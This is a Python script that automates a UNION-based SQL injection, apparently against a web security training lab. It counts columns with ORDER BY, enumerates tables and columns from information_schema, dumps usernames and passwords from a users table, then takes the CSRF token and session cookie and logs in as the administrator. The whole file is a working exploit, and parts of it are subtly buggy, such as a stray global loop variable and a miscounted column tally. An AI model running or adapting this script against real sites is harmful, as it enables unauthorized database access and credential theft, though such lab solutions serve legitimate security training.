import requests
import sys

def supportString(index, cols, URL):
    nulls = (cols * "null,").split(',')
    print(f"[-] Determining if column {index + 1} supports string...")
    nulls[index] = "'dummy'"
    payload = ",".join(nulls)[:-1]

    response = requests.get(URL + "'+UNION+SELECT+"+ payload +"+--+-+")
    if response.status_code == 200:
        print(f"[+] Column {i + 1} supports string...")
        return index
    else:
        print(f"[-] Column {i + 1} does not support string...")
        return None

def findCols(URL):
    i = 1
    cols = 0
    while True:
        response = requests.get(URL + "'+ORDER+BY+" + str(i) + "+--+-+")
        if response.status_code != 200:
            cols = i - 1
            print(f"[+] No. of columns : {(i -1)}")
            break
        i += 1
    return cols

if len(sys.argv) != 2:
    print(f"[+] USAGE : {sys.argv[0]} <URL of the lab>")
    sys.exit(1)

URL = sys.argv[1]

print("[-] Determining number of columns...")
cols = findCols(URL)

string_indices = []
for i in range(cols):
    string_indices.append(supportString(i, cols, URL))
print(f"[+] {len(string_indices)} column(s) support string in total...")

print("[-] Getting all the table names...")
response = requests.get(URL + "'+UNION+SELECT+table_name,null+FROM+information_schema.tables+--+-+")
tables = []
for i in response.text.split(" "):
    if i.startswith("<th>"):
        tables.append(i.replace("<th>", "").replace("</th>", "").replace("\n", ""))

blacklist = ["Gym", "Suit", "Eco", "Boat", "The", "Trapster", "Paint", "a", "rainbow", "Are", "In", "Struggling", "On"]
for table in tables:
    print(f"[-] Getting column info from table {table}")
    response = requests.get(URL + "'+UNION+SELECT+column_name,null+FROM+information_schema.columns+WHERE+table_name+=+'"+ table +"'+--+-+")
    for i in response.text.split(" "):
        if i.startswith("<th>"):
            column_name = i.replace("<th>", "").replace("</th>", "").replace("\n", "")
            if column_name not in blacklist:
                print("\t" + column_name)

print("[-] Dumping usernames...")
users = []
response = requests.get(URL + "'+UNION+SELECT+username_vqbido,password_wtxlzu+FROM+users_sjffoc+--+-+")
for i in response.text.split(" "):
    if i.startswith("<th>"):
        dumped_data = i.replace("<th>", "").replace("</th>", "").replace("\n", "")
        if dumped_data not in blacklist:
            users.append(dumped_data)

print("[-] Dumping passwords...")
pwds = []
for i in response.text.split(" "):
    if i.startswith("<td>"):
        dumped_data = i.replace("<td>", "").replace("</td>", "").replace("\n", "")
        if dumped_data not in blacklist:
            pwds.append(dumped_data)

print(f"[+] Admin user : {users[0]}")
print(f"[+] Admin pass : {pwds[0]}")

response = requests.get(URL.replace("/filter?category=Lifestyle", "") + "/login")
for i in response.text.split(" "):
    if i == 'name="csrf"':
        csrf = response.text.split(" ")[response.text.split(" ").index(i) + 1].replace('value="', "").replace('">\n', "")
        break
print(f"[+] CSRF token : {csrf}")
sess_cookie = response.cookies["session"]
print(f"[+] Session cookie : {sess_cookie}")

print("[-] Trying to log in...")
response = requests.post(URL.replace("/filter?category=Lifestyle", "") + "/login", data={"csrf":csrf, "username":users[0], "password":pwds[0]}, headers={"Cookie":"session="+sess_cookie})
print(response.text)
if response.status_code == 200:
    print("[+] SUCCESSFULL !!")
else:
    print("[-] TRY HARDER!!!")
